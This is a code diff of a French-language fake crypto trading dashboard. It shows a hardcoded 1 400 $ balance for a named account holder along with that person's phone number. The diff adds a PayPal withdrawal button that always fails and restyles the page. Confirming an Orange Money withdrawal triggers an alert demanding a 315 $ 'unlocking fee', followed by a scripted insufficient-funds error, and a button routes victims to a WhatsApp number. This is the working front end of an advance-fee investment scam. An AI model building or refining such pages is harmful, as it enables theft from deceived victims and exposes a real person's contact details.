@@ -3,30 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trading Crypto - Global Investissement</title>
+    <title>Global Investissement - Crypto Trading</title>
     <link rel="stylesheet" href="styles.css"> <!-- External CSS for better organization -->
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Roboto', sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #0b0e11;
-            color: #c9d1d9;
-            display: none;
+            background-color: #121212;
+            color: #ffffff;
         }
 
         header {
-            background-color: #21262d;
+            background-color: #1f1f1f;
             display: flex;
             justify-content: space-between;
-            padding: 10px 20px;
+            padding: 15px 30px;
             align-items: center;
-            flex-wrap: wrap;
         }
 
         header .logo h1 {
             margin: 0;
             color: #f0b90b;
+            font-size: 24px;
         }
 
         nav ul {
@@ -34,31 +33,31 @@
             margin: 0;
             padding: 0;
             display: flex;
-            flex-wrap: wrap;
         }
 
         nav ul li {
-            margin-right: 20px;
+            margin-right: 30px;
         }
 
         nav ul li a {
-            color: #c9d1d9;
+            color: #ffffff;
             text-decoration: none;
+            font-size: 16px;
         }
 
         nav .actions {
             display: flex;
             align-items: center;
-            flex-wrap: wrap;
         }
 
         nav .actions .balance {
             color: #f0b90b;
-            margin-right: 20px;
+            margin-right: 30px;
+            font-weight: bold;
         }
 
         nav .actions .account-info {
-            margin-right: 20px;
+            margin-right: 30px;
         }
 
         nav .actions button {
@@ -66,7 +65,7 @@
             border: none;
             padding: 10px 20px;
             cursor: pointer;
-            color: #21262d;
+            color: #121212;
             font-weight: bold;
             border-radius: 5px;
             margin-right: 10px;
@@ -76,7 +75,7 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            padding: 20px;
+            padding: 30px;
         }
 
         .trading-interface {
@@ -90,20 +89,20 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            background-color: #161b22;
+            background-color: #1c1c1c;
             padding: 20px;
-            border-radius: 5px;
+            border-radius: 10px;
             margin-bottom: 20px;
             color: #58a6ff;
-            flex-wrap: wrap;
         }
 
         .price-info h2 {
             margin: 0;
+            font-size: 24px;
         }
 
         .price-info .price {
-            font-size: 24px;
+            font-size: 28px;
             font-weight: bold;
         }
 
@@ -112,10 +111,10 @@
         }
 
         #chart_container {
-            height: 400px;
-            background-color: #161b22;
+            height: 500px;
+            background-color: #1c1c1c;
             margin-bottom: 20px;
-            border-radius: 5px;
+            border-radius: 10px;
             width: 100%;
         }
 
@@ -125,22 +124,24 @@
         }
 
         .order-book {
-            background-color: #161b22;
+            background-color: #1c1c1c;
             padding: 20px;
-            border-radius: 5px;
+            border-radius: 10px;
             width: 100%;
+            margin-bottom: 20px;
         }
 
         .order-book h3 {
             margin-top: 0;
             color: #58a6ff;
+            font-size: 20px;
         }
 
         .orders .order {
             display: flex;
             justify-content: space-between;
-            padding: 5px 0;
-            color: #c9d1d9;
+            padding: 10px 0;
+            color: #ffffff;
         }
 
         .orders .order span {
@@ -148,37 +149,30 @@
             text-align: center;
         }
 
-        .withdrawal-options {
+        .actions-container {
             display: flex;
-            justify-content: center;
-            margin-top: 20px;
+            justify-content: space-between;
+            margin-bottom: 20px;
             width: 100%;
         }
 
-        .withdrawal-options button {
+        .actions-container button {
             background-color: #f0b90b;
             border: none;
-            padding: 10px 20px;
+            padding: 15px 30px;
             cursor: pointer;
-            color: #21262d;
+            color: #121212;
             font-weight: bold;
-            width: 100%;
-            border-radius: 5px;
-        }
-
-        .error-message {
-            color: red;
-            margin-top: 20px;
-            text-align: center;
-            display: none;
+            width: 48%;
+            border-radius: 10px;
         }
 
         .withdrawal-form {
             display: none;
             flex-direction: column;
-            background-color: #161b22;
+            background-color: #1c1c1c;
             padding: 20px;
-            border-radius: 5px;
+            border-radius: 10px;
             margin-top: 20px;
             width: 100%;
         }
@@ -186,31 +180,52 @@
         .withdrawal-form h3 {
             margin-top: 0;
             color: #58a6ff;
+            font-size: 20px;
         }
 
-        .withdrawal-form .info {
+        .form-info {
             margin-bottom: 20px;
         }
 
         .withdrawal-form button {
             background-color: #f0b90b;
             border: none;
-            padding: 10px;
+            padding: 15px;
             cursor: pointer;
-            color: #21262d;
+            color: #121212;
             font-weight: bold;
             align-self: center;
-            border-radius: 5px;
+            border-radius: 10px;
         }
 
         footer {
-            background-color: #21262d;
-            color: #c9d1d9;
+            background-color: #1f1f1f;
+            color: #ffffff;
             text-align: center;
-            padding: 10px 0;
+            padding: 20px 0;
         }
 
         @media (max-width: 768px) {
+            header, nav, .price-info, .order-book, .actions-container, .withdrawal-form {
+                padding: 10px;
+                margin-bottom: 15px;
+            }
+
+            .price-info {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+
+            .actions-container {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .actions-container button {
+                width: 100%;
+                margin-bottom: 10px;
+            }
+
             nav ul {
                 flex-direction: column;
                 align-items: center;
@@ -220,14 +235,13 @@
                 margin-bottom: 10px;
             }
 
-            .price-info,
-            .withdrawal-options {
+            nav .actions {
                 flex-direction: column;
-                align-items: center;
+                align-items: flex-start;
             }
 
-            .withdrawal-options button {
-                width: 100%;
+            nav .actions .balance,
+            nav .actions .account-info {
                 margin-bottom: 10px;
             }
         }
@@ -247,14 +261,14 @@
 
     <header>
         <div class="logo">
-            <h1> GLOBAL TRADING INVESTISSEMENT</h1>
+            <h1>Global Investissement</h1>
         </div>
         <nav>
             <div class="actions">
                 <span class="balance">Solde: 1 400 $</span>
                 <div class="account-info">
-                    <span id="user-name">MAVAKALA  CLEMENCE</span><br>
-                    <span id="user-phone">243 089 252 2528  </span>
+                    <span id="user-name">MAVAKALA CLEMENCE</span><br>
+                    <span id="user-phone">243 089 252 2528</span>
                 </div>
                 <button id="whatsapp-button">Contact WhatsApp</button>
                 <button id="logout-button">Déconnexion</button>
@@ -279,14 +293,16 @@
                         <span class="amount">0.19707 BTC</span>
                         <span class="total">13,395.70515 USDT</span>
                     </div>
+                    <!-- Repeat for more orders -->
                 </div>
             </section>
-            <section class="withdrawal-options">
-                <button id="orange-money">Retirer</button>
+            <section class="actions-container">
+                <button id="orange-money">Retirer via Orange Money</button>
+                <button id="paypal">Retirer via PayPal</button>
             </section>
             <section class="withdrawal-form" id="withdrawal-form">
                 <h3>Confirmer le retrait</h3>
-                <div class="info" id="withdrawal-info"></div>
+                <div class="form-info" id="withdrawal-info"></div>
                 <button id="confirm-withdrawal">Valider le Retrait</button>
             </section>
             <section class="error-message" id="error-message"></section>
@@ -313,23 +329,30 @@
 
             setInterval(updatePrice, 5000);
 
-            const setWithdrawalInfo = () => {
-                const paymentMethod = "Orange Money";
-                const accountName = "MAVAKALA  CLEMENCE";
+            const setWithdrawalInfo = (method) => {
+                const accountName = "MAVAKALA CLEMENCE";
                 const accountNumber = "243 089 252 2528";
-                withdrawalInfo.innerHTML = `${accountName}<br><br> ${accountNumber}<br><br> 1 400 $`;
+                const balance = "1 400 $";
+                withdrawalInfo.innerHTML = `${accountName}<br>${accountNumber}<br>${balance}<br>via ${method}`;
                 withdrawalForm.style.display = 'flex';
             };
 
             document.getElementById('orange-money').addEventListener('click', () => {
-                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer ?");
+                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via Orange Money ?");
                 if (confirmWithdrawal) {
-                    setWithdrawalInfo();
+                    setWithdrawalInfo("Orange Money");
+                }
+            });
+
+            document.getElementById('paypal').addEventListener('click', () => {
+                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via PayPal ?");
+                if (confirmWithdrawal) {
+                    alert("Vous n'avez pas de compte PayPal lié.");
                 }
             });
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Cher MAVAKALA veuillez payer les frais de déblocages de 315 $ pour recevoir vos benefices dans les 5 minutes');
+                alert('Cher MAVAKALA, veuillez payer les frais de déblocages de 315 $ pour recevoir vos bénéfices dans les 5 minutes.');
                 withdrawalForm.style.display = 'none';
                 errorMessage.style.display = 'block';
                 errorMessage.textContent = 'Erreur : Fonds insuffisants pour les frais de déblocage.';
@@ -339,7 +362,11 @@
                 window.location.href = "https://wa.me/18709230259";
             });
 
-            // Ensure the TradingView chart is displayed
+            document.getElementById('logout-button').addEventListener('click', () => {
+                alert("Déconnexion réussie.");
+                window.location.reload();
+            });
+
             new TradingView.widget({
                 container_id: "tradingview_chart",
                 autosize: true,
